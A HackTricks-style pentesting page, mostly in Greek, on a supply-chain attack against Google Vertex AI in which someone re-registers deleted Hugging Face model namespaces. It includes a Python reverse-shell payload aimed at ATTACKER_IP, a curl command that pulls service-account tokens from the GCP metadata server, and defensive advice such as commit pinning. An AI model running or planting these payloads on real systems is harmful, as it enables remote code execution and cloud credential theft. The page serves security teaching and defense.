# GCP - Vertex AI Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## Σενάριο

- Vertex AI Model Garden επιτρέπει την άμεση ανάπτυξη πολλών Hugging Face (HF) μοντέλων.
- HF model identifiers are Author/ModelName. Εάν ένας author/org στο HF διαγραφεί, το ίδιο author name μπορεί να επανα-εγγραφεί από οποιονδήποτε. Οι attackers μπορούν τότε να δημιουργήσουν ένα repo με το ίδιο ModelName στη legacy path.
- Pipelines, SDKs, or cloud catalogs που κάνουν fetch μόνο με το όνομα (no pinning/integrity) θα κατεβάσουν το attacker-controlled repo. Όταν το μοντέλο αναπτυχθεί, loader code από αυτό το repo μπορεί να εκτελεστεί μέσα στο Vertex AI endpoint container, δίνοντας RCE με τα permissions του endpoint.

Two common takeover cases on HF:
- Ownership deletion: Το παλιό path επιστρέφει 404 μέχρι κάποιος να επανα-εγγράψει τον author και να δημοσιεύσει το ίδιο ModelName.
- Ownership transfer: HF issues 307 redirects from old Author/ModelName to the new author. Εάν ο παλιός author αργότερα διαγραφεί και επανα-εγγραφεί από έναν attacker, η αλυσίδα redirect σπάει και το attacker’s repo σερβίρει στη legacy path.

## Εντοπισμός Επαναχρησιμοποιήσιμων Namespaces (HF)

- Old author deleted: η σελίδα για τον author επιστρέφει 404; το model path μπορεί να επιστρέψει 404 μέχρι takeover.
- Transferred models: το παλιό model path εκδίδει 307 στον νέο owner όσο ο παλιός author υπάρχει. Εάν ο παλιός author αργότερα διαγραφεί και επανα-εγγραφεί, η legacy path θα επιλύεται στο attacker’s repo.

Γρήγοροι έλεγχοι με curl:
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>
# 200 = exists, 404 = deleted/available

# Check old model path behavior
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 = redirect to new owner (transfer case)
# 404 = missing (deletion case) until someone re-registers
```
## Ροή επίθεσης από άκρο σε άκρο κατά του Vertex AI

1) Ανακάλυψε επαναχρησιμοποιήσιμους namespaces μοντέλων που το Model Garden εμφανίζει ως deployable:
- Εντόπισε HF models στο Vertex AI Model Garden που εξακολουθούν να εμφανίζουν “verified deployable”.
- Επαλήθευσε στο HF αν ο αρχικός author έχει διαγραφεί ή αν το model μεταφέρθηκε και ο παλιός author αφαιρέθηκε αργότερα.

2) Επανεγγράψε τον διαγραμμένο author στο HF και αναδημιούργησε το ίδιο ModelName.

3) Δημοσίευσε ένα κακόβουλο repo. Συμπεριέλαβε κώδικα που εκτελείται κατά το model load. Παραδείγματα που συνήθως εκτελούνται κατά το HF model load:
- Side effects στο __init__.py του repo
- Προσαρμοσμένο modeling_*.py ή processing code που αναφέρεται από το config/auto_map
- Διαδρομές κώδικα που απαιτούν trust_remote_code=True σε Transformers pipelines

4) Μια Vertex AI deployment του legacy Author/ModelName τώρα τραβάει το attacker repo. Ο loader εκτελείται μέσα στο Vertex AI endpoint container.

5) Το payload δημιουργεί πρόσβαση από το endpoint περιβάλλον (RCE) με τα permissions του endpoint.

Παράδειγμα αποσπάσματος payload που εκτελείται κατά το import (μόνο για επίδειξη):
```python
# Place in __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # Or python -c exec ...

if os.environ.get("VTX_AI","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Σημειώσεις
- Στην πράξη, οι loaders ποικίλλουν. Πολλές Vertex AI HF integrations κλωνοποιούν και εισάγουν repo modules που αναφέρονται στο config του μοντέλου (π.χ. auto_map), κάτι που μπορεί να προκαλέσει εκτέλεση κώδικα. Κάποιες χρήσεις απαιτούν trust_remote_code=True.
- Το endpoint τυπικά τρέχει σε ένα αφιερωμένο container με περιορισμένο πεδίο, αλλά αποτελεί έγκυρη αρχική εστία για πρόσβαση σε δεδομένα και lateral movement στο GCP.

## Post-Exploitation Tips (Vertex AI Endpoint)

Μόλις code εκτελείται μέσα στο endpoint container, σκεφτείτε:
- Εξερεύνηση των environment variables και του metadata για credentials/tokens
- Πρόσβαση σε attached storage ή σε mounted model artifacts
- Αλληλεπίδραση με Google APIs μέσω της ταυτότητας service account (Document AI, Storage, Pub/Sub, κ.λπ.)
- Persistence στο model artifact σε περίπτωση που η πλατφόρμα re-pulls το repo

Καταγράψτε τα instance metadata αν είναι προσβάσιμα (container dependent):
```bash
curl -H "Metadata-Flavor: Google" \
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
## Οδηγίες άμυνας για χρήστες Vertex AI

- Pin models by commit in HF loaders για να αποτρέψετε τη σιωπηλή αντικατάσταση:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Κατοπτρίστε ελεγμένα HF models σε ένα αξιόπιστο εσωτερικό artifact store/registry και αναπτύξτε από εκεί.
- Σαρώστε συνεχώς codebases και configs για hard-coded Author/ModelName που έχουν διαγραφεί/μεταφερθεί· ενημερώστε σε νέα namespaces ή κλειδώστε σε συγκεκριμένο commit.
- Στο Model Garden, επαληθεύστε την προέλευση του μοντέλου και την ύπαρξη του author πριν την ανάπτυξη.

## Ευριστικές αναγνώρισης (HTTP)

- Deleted author: author page 404; legacy model path 404 μέχρι την ανάληψη.
- Transferred model: legacy path 307 προς νέο author ενώ ο παλιός author υπάρχει· αν ο παλιός author διαγραφεί αργότερα και επανα-καταχωρηθεί, το legacy path εξυπηρετεί περιεχόμενο attacker.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Διασταυρούμενες Αναφορές

- Δείτε τη γενικότερη μεθοδολογία και τις σημειώσεις για την εφοδιαστική αλυσίδα:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Αναφορές

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
